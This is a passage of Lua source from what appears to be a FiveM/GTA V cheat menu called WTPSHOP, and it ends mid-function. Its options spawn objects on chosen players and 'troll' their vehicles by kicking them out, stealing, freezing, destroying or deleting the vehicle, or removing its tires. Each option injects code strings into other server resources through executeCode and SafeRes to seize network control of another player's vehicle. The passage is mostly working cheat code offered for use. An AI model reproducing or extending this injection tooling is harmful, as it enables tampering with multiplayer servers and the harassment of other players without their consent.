                            values = {"p_ferris_wheel_amo_l", "p_ferris_wheel_amo_l2", "p_ferris_wheel_amo_p", "prop_gas_tank_02a", "xs_propint2_building_base_01", "ar_prop_ar_neon_gate8x_02a", "sr_prop_stunt_tube_xs_02a", "xs_terrain_set_dyst_01_grnd", "xs_prop_arena_goal", "xs_propint3_waste_01_statues"},
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select at least one player!", 3000)
                                    return
                                end

                                function WTPSHOP:GetSelectedObjectModel()
                                    return value
                                end

                                WTPSHOP:SpawnSelectedObjects(targetPlayers)

                                self:Notify("success", "WTPSHOP", "Spawned object '" .. tostring(value) .. "' for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                        {
                            type = "scrollable",
                            label = "Spawn Location",
                            scrollType = "onEnter",
                            value = 1,
                            values = {"City", "Docks", "Playa Vista", "Mountain", "Pink Cage", "Vespucci", "Mega Mall"},
                            onSelect = function(value)
                                local targetPlayers = {}
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayers[#targetPlayers + 1] = serverId
                                    end
                                end

                                if #targetPlayers == 0 then
                                    self:Notify("error", "WTPSHOP", "You must select at least one player!", 3000)
                                    return
                                end
                                local mapValues = {
                                    ["City"] = "dt1_lod_slod3",
                                    ["Docks"] = "id2_lod_slod4",
                                    ["Playa Vista"] = "kt1_lod_slod4",
                                    ["Mountain"] = "ch2_lod_slod3",
                                    ["Pink Cage"] = "hw1_lod_slod4",
                                    ["Vespucci"] = "kt1_lod_slod4",
                                    ["Mega Mall"] = "sc1_lod_slod4"
                                }
                                local mapHash = mapValues[value]
                                function WTPSHOP:GetSelectedObjectModel()
                                    return mapHash
                                end

                                WTPSHOP:SpawnSelectedObjects(targetPlayers)

                                self:Notify("success", "WTPSHOP", "Attach Location for " .. #targetPlayers .. " player(s).", 5000)
                            end
                        },
                    }
                },
                {
                    label = "Vehicle",
                    tabs = {
                        { icon = "", type = "scrollable", value = 1, values = { "Kick From Vehicle", "Bring Vehicle", "Freeze Vehicle", "Destroy Vehicle", "Delete Vehicle", "Steal Vehicle", "Remove Vehicle Tires", "Launch Vehicle"}, label = "Vehicle Troll",
                            onSelect = function(value)
                                local targetPlayer = nil
                                for serverId, checked in pairs(CPlayers) do
                                    if checked then
                                        targetPlayer = serverId
                                        break
                                    end
                                end

                                if targetPlayer then
                                    local player = GetPlayerFromServerId(targetPlayer)
                                    if player == -1 then
                                        self:Notify("error", "WTPSHOP", "There was an error while trying to kick the player from their vehicle! (ERR:1)", 3000)
                                        CPlayers[targetPlayer] = nil
                                        WTPSHOP:UpdateListMenu()
                                        return
                                    end

                                    if not DoesEntityExist(GetVehiclePedIsUsing(GetPlayerPed(player))) then
                                        self:Notify("error", "WTPSHOP", "There was an error while trying to kick the player from their vehicle! (ERR:2)", 3000)
                                        return
                                    end

                                    if value == "Kick From Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTPSHOP.Native(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTPSHOP.Native(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, driver, true, true)
                                                                WTPSHOP.Native(SpecialFunctionDoNotUse, driver, true)
                                                                WTPSHOP.Native(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTPSHOP.Native(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTPSHOP.Native(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTPSHOP.Native(DeleteEntity, currentDriver)
                                                                end

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTPSHOP.Native(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTPSHOP.Native(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Bring Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCoords(entity, coords)
                                                            WTPSHOP.Native(SetEntityCoordsNoOffset, entity, coords.x, coords.y, coords.z, true, true, false)
                                                        end
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTPSHOP.Native(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTPSHOP.Native(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, driver, true, true)
                                                                WTPSHOP.Native(SpecialFunctionDoNotUse, driver, true)
                                                                WTPSHOP.Native(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTPSHOP.Native(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTPSHOP.Native(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTPSHOP.Native(DeleteEntity, currentDriver)
                                                                end

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTPSHOP.Native(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTPSHOP.Native(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        SetCoords(vehicle, GetEntityCoords(PlayerPedId()))
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Freeze Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTPSHOP.Native(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTPSHOP.Native(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, driver, true, true)
                                                                WTPSHOP.Native(SpecialFunctionDoNotUse, driver, true)
                                                                WTPSHOP.Native(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTPSHOP.Native(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTPSHOP.Native(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTPSHOP.Native(DeleteEntity, currentDriver)
                                                                end

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTPSHOP.Native(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTPSHOP.Native(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        WTPSHOP.Native(FreezeEntityPosition, vehicle, true)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Destroy Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTPSHOP.Native(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTPSHOP.Native(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, driver, true, true)
                                                                WTPSHOP.Native(SpecialFunctionDoNotUse, driver, true)
                                                                WTPSHOP.Native(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTPSHOP.Native(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTPSHOP.Native(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTPSHOP.Native(DeleteEntity, currentDriver)
                                                                end

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTPSHOP.Native(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTPSHOP.Native(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        WTPSHOP.Native(SetVehicleEngineHealth, vehicle, -4000)
                                                        WTPSHOP.Native(SetVehicleBodyHealth, vehicle, -4000)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Delete Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTPSHOP.Native(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTPSHOP.Native(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, driver, true, true)
                                                                WTPSHOP.Native(SpecialFunctionDoNotUse, driver, true)
                                                                WTPSHOP.Native(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTPSHOP.Native(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTPSHOP.Native(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTPSHOP.Native(DeleteEntity, currentDriver)
                                                                end

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTPSHOP.Native(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTPSHOP.Native(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        WTPSHOP.Native(DeleteEntity, vehicle)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Steal Vehicle" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTPSHOP.Native(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTPSHOP.Native(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, driver, true, true)
                                                                WTPSHOP.Native(SpecialFunctionDoNotUse, driver, true)
                                                                WTPSHOP.Native(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTPSHOP.Native(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTPSHOP.Native(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTPSHOP.Native(DeleteEntity, currentDriver)
                                                                end

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTPSHOP.Native(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTPSHOP.Native(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        WTPSHOP.Native(TaskWarpPedIntoVehicle, PlayerPedId(), vehicle, -1)
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Remove Vehicle Tires" then
                                        executeCode(targetRes, string.format([[
                                            local playerId = GetPlayerFromServerId(%d)
                                            if playerId and playerId ~= -1 then
                                                local targetPed = GetPlayerPed(playerId)
                                                if DoesEntityExist(targetPed) then
                                                    local vehicle = GetVehiclePedIsIn(targetPed, false)
                                                    if vehicle and vehicle > 0 then
                                                        local function SetCurrentSelfData(setData)
                                                            local selfPed = PlayerPedId()
                                                            local setVehicle = setData.vehicle
                                                            local setSeat = setData.seat

                                                            if setVehicle and setSeat and DoesEntityExist(setVehicle) then
                                                                WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, setVehicle, setSeat)
                                                            else
                                                                WTPSHOP.Native(SetEntityCoordsNoOffset, selfPed, setData.coords, false, false, true)
                                                                WTPSHOP.Native(SetEntityHeading, selfPed, setData.heading)
                                                            end
                                                        end
                                                        local function GetCachedSelfData()
                                                            local selfPed = PlayerPedId()
                                                            local selfVehicle = GetVehiclePedIsIn(selfPed, -1)
                                                            local selfData = {
                                                                ped = selfPed,
                                                                coords = GetEntityCoords(selfPed),
                                                                heading = GetEntityHeading(selfPed)
                                                            }

                                                            selfVehicle = selfVehicle and selfVehicle > 0 and selfVehicle

                                                            if selfVehicle then
                                                                selfData.vehicle = selfVehicle

                                                                for i = -1, GetVehicleModelNumberOfSeats(GetEntityModel(selfVehicle)) - 1 do
                                                                    if GetPedInVehicleSeat(selfVehicle, i) == selfPed then
                                                                        selfData.seat = i

                                                                        break
                                                                    end
                                                                end
                                                            end

                                                            return selfData
                                                        end

                                                        local function TakeControlOfVehicle(vehicle)
                                                            local driver = GetPedInVehicleSeat(vehicle, -1)
                
                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            local cachedSelfData = GetCachedSelfData()
                                                            local selfPed = cachedSelfData.ped

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)

                                                            Wait(0)

                                                            local startTimer = GetGameTimer()

                                                            while DoesEntityExist(vehicle) and (GetGameTimer() - startTimer) <= 1000 and not WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) do
                                                                selfPed = PlayerPedId()

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, driver, true, true)
                                                                WTPSHOP.Native(SpecialFunctionDoNotUse, driver, true)
                                                                WTPSHOP.Native(DeleteEntity, driver)

                                                                local currentDriver = GetPedInVehicleSeat(vehicle, -1)
                                                                if currentDriver and currentDriver > 0 and currentDriver ~= selfPed and currentDriver ~= driver then
                                                                    WTPSHOP.Native(SetEntityAsMissionEntity, currentDriver, true, true)
                                                                    WTPSHOP.Native(SpecialFunctionDoNotUse, currentDriver, true)
                                                                    WTPSHOP.Native(DeleteEntity, currentDriver)
                                                                end

                                                                WTPSHOP.Native(SetEntityAsMissionEntity, vehicle, true, true)
                                                                WTPSHOP.Native(TaskEnterVehicle, selfPed, vehicle, 100, -1, 2.0, 16, 0)

                                                                Wait(0)
                                                            end

                                                            WTPSHOP.Native(SetPedVehicleForcedSeatUsage, selfPed, vehicle, -1, 16)
                                                            WTPSHOP.Native(TaskWarpPedIntoVehicle, selfPed, vehicle, -1)

                                                            Wait(0)

                                                            selfPed = PlayerPedId()

                                                            WTPSHOP.Native(ClearPedTasksImmediately, selfPed)
                                                            SetCurrentSelfData(cachedSelfData)

                                                            if WTPSHOP.Native(NetworkHasControlOfEntity, vehicle) then
                                                                return true
                                                            end

                                                            return false
                                                        end
                                                        TakeControlOfVehicle(vehicle)
                                                        for i = 0, 7 do
                                                            WTPSHOP.Native(BreakOffVehicleWheel, vehicle, i, true, false, false, false)
                                                        end
                                                    end
                                                end
                                            end
                                        ]], targetPlayer))
                                        CPlayers[targetPlayer] = true
                                        self:UpdateListMenu()
                                    elseif value == "Launch Vehicle" then
                                        for i = 1, 2 do
                                            ApiRasclat.SafeRes(string.format([[
                                                local function SafeWrap(fn)
                                                    return function(...)
                                                        return fn(...)
                                                    end
                                                end

                                                local SafeThread = SafeWrap(CreateThread)
                                                local SafePlayerPedId = SafeWrap(PlayerPedId)
                                                local SafeDoesEntityExist = SafeWrap(DoesEntityExist)
                                                local SafeGetEntityCoords = SafeWrap(GetEntityCoords)
                                                local SafeSetEntityVisible = SafeWrap(SetEntityVisible)
